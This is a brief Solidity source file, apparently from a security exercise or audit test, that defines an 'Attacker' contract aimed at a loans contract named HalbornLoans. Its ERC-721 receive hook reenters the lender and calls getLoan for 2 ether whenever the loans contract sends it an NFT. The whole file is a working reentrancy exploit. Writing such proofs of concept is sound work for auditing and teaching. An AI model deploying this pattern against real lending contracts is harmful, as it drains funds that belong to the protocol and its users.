// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IERC721Receiver} from "openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";

interface IHalbornLoans {
    function getLoan(uint256 amount) external;
}

contract Attacker is IERC721Receiver {
    address public loans;

    constructor(address loans_) {
        loans = loans_;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        if (from == loans) {
            //the loans contract is sending our NFT => reenter and cal getLoan
            IHalbornLoans(loans).getLoan(2 ether);
        }

        return this.onERC721Received.selector;
    }
}
